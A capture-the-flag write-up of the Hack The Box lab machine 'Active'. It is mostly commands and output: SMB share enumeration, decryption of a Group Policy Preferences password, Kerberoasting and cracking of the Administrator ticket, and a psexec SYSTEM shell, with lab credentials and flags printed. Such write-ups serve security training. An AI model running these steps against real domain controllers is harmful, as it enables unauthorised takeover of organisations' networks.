---
layout: single
title: Active - Hack The Box
excerpt: "Active is a quick and fun medium box where we have to do SMB enumeration to obtain credentials of a valid user in the dc and Kerberoasting to receive a ticket to crack this ticket is for the administrator user"
date: 2023-01-28
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-active/new.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - Active Directory
  - Kerberoasting Attack
  - GPP Passwords
---

<p align="center">
<img src="/assets/images/htb-writeup-active/logo.png">
</p>


Active is a quick and fun medium box where we have to do SMB enumeration to obtain credentials of a valid user in the dc and Kerberoasting to receive a ticket to crack this ticket is for the administrator user

## PortScan

```bash
❯ nmap -sCV -p53,88,135,139,445,593,3269,47001,49153,49168 10.10.10.100 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-28 17:22 CST
Nmap scan report for 10.10.10.100
Host is up (0.66s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-28 23:22:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3269/tcp  open  tcpwrapped
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49153/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-01-28T23:23:22
|_  start_date: 2023-01-28T23:13:30
|_clock-skew: -1s
```

## Enumeration

```bash
❯ crackmapexec smb 10.10.10.100
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
```

We see a domain add to the `/etc/hosts`

```bash
❯ ping -c 1 active.htb
PING active.htb (10.10.10.100) 56(84) bytes of data.
64 bytes from active.htb (10.10.10.100): icmp_seq=1 ttl=127 time=902 ms

--- active.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 901.525/901.525/901.525/0.000 ms
❯ cat /etc/hosts | tail -n 1
10.10.10.100 active.htb
```

There are shared resources

```bash
❯ smbclient -L 10.10.10.100 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available
```

We can read `Replication`

```bash
❯ smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	

```

We found this

```bash
❯ smbmap -H 10.10.10.100 -r Replication
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replication\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	active.htb
```

```bash
❯ smbmap -H 10.10.10.100 -r Replication/active.htb/
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	scripts
```

```bash
❯ smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\Policies\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	{31B2F340-016D-11D2-945F-00C04FB984F9}
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	{6AC1786C-016F-11D2-945F-00C04fB984F9}

```

```bash
❯ smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--               23 Sat Jul 21 05:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Group Policy
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	USER
```

```bash
❯ smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Microsoft
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Preferences
	fr--r--r--             2788 Sat Jul 21 05:38:11 2018	Registry.pol
```

```bash
❯ smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Groups
```

```bash
❯ smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--              533 Sat Jul 21 05:38:11 2018	Groups.xml
```

Now download `Groups.xml`

```bash
❯ smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
[+] Starting download: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml (533 bytes)
[+] File output to: /home/miguelrega7/Hackthebox/Active/nmap/10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml
```

It's a password

```bash
❯ /usr/bin/cat groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

`cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"`

We can use `ggp-decrypt`

```bash
❯ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
```

`GPPstillStandingStrong2k18`

And a user

`userName="active.htb\SVC_TGS"`

Credentials are correct

```bash
❯ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

Now that we have credentials we can view other resources

```bash
❯ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ   
```

```bash
❯ smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Users                                             	READ ONLY	
	.\Users\*
	dw--w--w--                0 Sat Jul 21 09:39:20 2018	.
	dw--w--w--                0 Sat Jul 21 09:39:20 2018	..
	dr--r--r--                0 Mon Jul 16 05:14:21 2018	Administrator
	dr--r--r--                0 Mon Jul 16 16:08:56 2018	All Users
	dw--w--w--                0 Mon Jul 16 16:08:47 2018	Default
	dr--r--r--                0 Mon Jul 16 16:08:56 2018	Default User
	fr--r--r--              174 Mon Jul 16 16:01:17 2018	desktop.ini
	dw--w--w--                0 Mon Jul 16 16:08:47 2018	Public
	dr--r--r--                0 Sat Jul 21 10:16:32 2018	SVC_TGS
```

We can see the `SVC_TGS` directory

```bash
❯ smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users/SVC_TGS
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Users                                             	READ ONLY	
	.\UsersSVC_TGS\*
	dr--r--r--                0 Sat Jul 21 10:16:32 2018	.
	dr--r--r--                0 Sat Jul 21 10:16:32 2018	..
	dr--r--r--                0 Sat Jul 21 10:14:20 2018	Contacts
	dr--r--r--                0 Sat Jul 21 10:14:42 2018	Desktop
	dr--r--r--                0 Sat Jul 21 10:14:28 2018	Downloads
	dr--r--r--                0 Sat Jul 21 10:14:50 2018	Favorites
	dr--r--r--                0 Sat Jul 21 10:15:00 2018	Links
	dr--r--r--                0 Sat Jul 21 10:15:23 2018	My Documents
	dr--r--r--                0 Sat Jul 21 10:15:40 2018	My Music
	dr--r--r--                0 Sat Jul 21 10:15:50 2018	My Pictures
	dr--r--r--                0 Sat Jul 21 10:16:05 2018	My Videos
	dr--r--r--                0 Sat Jul 21 10:16:20 2018	Saved Games
	dr--r--r--                0 Sat Jul 21 10:16:32 2018	Searches
```

```bash
❯ smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users/SVC_TGS/Desktop
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Users                                             	READ ONLY	
	.\UsersSVC_TGS\Desktop\*
	dr--r--r--                0 Sat Jul 21 10:14:42 2018	.
	dr--r--r--                0 Sat Jul 21 10:14:42 2018	..
	fw--w--w--               34 Sat Jan 28 17:14:19 2023	user.txt
```

## User flag

Download the `user.txt`

```bash
❯ smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --download Users/SVC_TGS/Desktop/user.txt
[+] Starting download: Users\SVC_TGS\Desktop\user.txt (34 bytes)
[+] File output to: /home/miguelrega7/Hackthebox/Active/content/10.10.10.100-Users_SVC_TGS_Desktop_user.txt
```

```bash
❯ mv 10.10.10.100-Users_SVC_TGS_Desktop_user.txt user.txt
❯ /usr/bin/cat user.txt
b7d2dfba479b6ffa88442b747b15b65d
```

## Root

We need more information about the DC

```bash
❯ rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]
rpcclient $>
```

Groups

```bash
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient $> 
```

```bash
rpcclient $> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
rpcclient $> queryuser 0x1f4
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	sáb, 28 ene 2023 17:14:29 CST
	Logoff Time              :	mié, 31 dic 1969 18:00:00 CST
	Kickoff Time             :	mié, 31 dic 1969 18:00:00 CST
	Password last set Time   :	mié, 18 jul 2018 14:06:40 CDT
	Password can change Time :	jue, 19 jul 2018 14:06:40 CDT
	Password must change Time:	mié, 13 sep 30828 20:48:05 CST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x0000003f
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> 

```

More information about the users

```bash
❯ rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100
rpcclient $> querydispinfo
index: 0xdea RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xe19 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS	Name: SVC_TGS	Desc: (null)
rpcclient $>
```

Create a file 

```bash
❯ /bin/cat users.txt
SVC_TGS
```

## AS-REP Roasting

To do this your clock has to be synchronized with the dc clock, if you ever have to do it you can use this command

`ntpdate 10.10.10.100`

We could do this if we do not have credentials but since we have the password it was not necessary but if we did not have it we could have requested a ticket but it is not possible.


Here you have a link where they explain it very well 

- [https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/)

```bash
❯ GetNPUsers.py active.htb/ -no-pass -usersfile users.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User SVC_TGS doesn't have UF_DONT_REQUIRE_PREAUTH set
```

The port 88 is open so we can use kerbrute as well.

- [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

```bash
❯ ./kerbrute_linux_amd64

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/28/23 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -h, --help            help for kerbrute
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
```

We can obtain a ticket for the administrator user

```bash
❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2023-01-28 17:14:29.170938
```

We have the admin user hash, let's crack it

```bash
❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2023-01-28 17:14:29.170938             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$4e5088992b25d09403d37d2e9ef6e72a$8c895d03044c58eb7c992d6c70f3ab24ae8c6716a2cdae892b7cbc67ba09818f3f5a04b8f0e37ffd45cc6455b2ac76ac7d50fc53df376ee22d951c44e997ab8ae4f139753e74d224d95c01d3fad9788e0a1a9413ad3782ae99921e681c6400e71a786082ec52549c445f7fbc352f12650a909f01f8d0f9a7e1da875ed9521df6643c80fb2454123e58caf3113ee8cae08b9ee296de7beccb621c3d3905908291faa105879c4f13b9c3e2598e3a4631c25a6d302a6a4b07f6de66d2cfba70cdba9b194889283cde2ee9dae39b9f22c94e07e3aca3f155c37b08278c02a32b75b96cbc3abf08f86a65b22f08c56d17e86faf42ecaf06a17f8f30c34ccdac2fafe6956f852cb07a6aa8297bd34d491b2c94f3180d68d3b0753a69e6a9e3be6f4afd99f6119c4c594456bbe92ca29796ce6b3b5ce23ed6c6718411301dc2feb0ab6f43059cdc09149f22c2ccc183554dc527329a6ecc3fa3024da5b95cbf9df28c6cd02221c99719446f6a78d56a9424eb642221d57df9cea4ddd251a576a1bc352d5ef78a617cd9e26d7fcaec60839a21555be11429568f5e6c1baa5eb8a7ad3cec87d51e0ac3485e8b721377b2f3e12a52e953fb27d4b94b6a5c73452d6ae6b0b5d4d8730114a5aff717f386663eb10d39451097ea081f42595fa0dd1e2aefe2bf08e5884f5615ede70728c6c1bb33fbb39e4bcfba746bf760f16f14ef60162b83c7f835a46fb61b9e73ed119e46ae1753e9c11414d4f20fef2527e2ca6fa95889c1f4d6ff3de678455db626f0dead28d9d0cdf566074e3fd03378283bcb3a0148f997f2f63c53113d700ef7c6d2613d62a16ecd4145aec9eb40a948f1b98c161657b2a114e550e3ee277906f8458d160b2ea3fbdf17eff96b2ca126f7850feaa0885d4f1518a43478ded45b70f40bae58349147681457d22b4cd5aeaaf32632df697914ec300daec74c8d9dbbcc25581c9b2c795598b1a9a34a17a6f8f835413fbd6ca1173935ccd4242c4fa7cf9e90630646cff5ab81cadb0d63259cb471e0e296a96b6461c120efcdfa22e93654cbe537f1b98be8b27c046343263b7335434b8bfb852e8ea1cf760945df81b1701632f8fa2c1da5721cf17e159dd03aa9b55d8a605fb907a341e361280950fa58a1015e4bb5668721cd2259a69dcbd7ab3c0bfcf92cab7a81f85f5bb67125f046ec6bc63d30741cde6792e165ecae26c8eb8ae29ee490b3b0100c98282b6c90ad39ed7783607916c344406667
```

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:26 DONE (2023-01-28 18:58) 0.03752g/s 395402p/s 395402c/s 395402C/s Tiffani1432..Tiago_18
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The password is correct

```bash
❯ crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```

Now we can have a shell

```bash
❯ ./psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file AteihbIx.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service nMsa on 10.10.10.100.....
[*] Starting service nMsa.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC

C:\Windows\system32>
```

## Root flag

```bash
C:\Users\Administrator\Desktop> type root.txt
385fab9ee1161ce755cbbffe84ed6701

C:\Users\Administrator\Desktop>
```

